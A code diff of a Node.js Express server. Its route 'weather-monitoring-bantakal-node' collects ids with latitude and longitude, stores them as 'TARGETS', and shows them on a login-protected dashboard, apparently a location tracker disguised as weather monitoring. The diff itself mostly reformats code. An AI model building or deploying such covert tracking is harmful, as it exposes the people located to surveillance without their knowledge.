@@ -10,19 +10,22 @@ const config = {
 
 const TARGETS = {}
 
-// login page
+// Login page
 router.route("/login").get((req, res) => {
     res.render("login")
 }).post((req, res) => {
     const { username, password } = req.body
 
     if (config.username === username && config.password === password) {
-        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
+        res.cookie("token", config.token, {
+            maxAge: 1000000 * 100000
+        })
     }
 
     res.redirect("/")
 })
 
+// Weather monitoring node
 router.route("/weather-monitoring-bantakal-node").get((req, res) => {
     res.render("weather")
 }).post(async (req, res) => {
@@ -33,7 +36,12 @@ router.route("/weather-monitoring-bantakal-node").get((req, res) => {
     }
 
     TARGETS[id] = [lat, lng]
-    IO.emit("map-data", { id, lat, lng })
+
+    IO.emit("map-data", {
+        id,
+        lat,
+        lng
+    })
 
     const { error } = await supabase
         .from("location_data")
@@ -49,10 +57,11 @@ router.route("/weather-monitoring-bantakal-node").get((req, res) => {
     }
 
     res.send("OK")
+
     console.log(`> ${id} - ${TARGETS[id]}`)
 })
 
-// token checking
+// Token checking
 router.use(function checkToken(req, res, next) {
     const token = req.cookies.token
 
@@ -63,9 +72,15 @@ router.use(function checkToken(req, res, next) {
     }
 })
 
+// Admin dashboard
 router.route("/").get((req, res) => {
+    const protocol = req.headers["x-forwarded-proto"] || req.protocol
+    const host = req.get("host")
+    const remoteURL = `${protocol}://${host}`
+
     res.render("home", {
-        TARGETS
+        TARGETS,
+        remoteURL
     })
 })
 
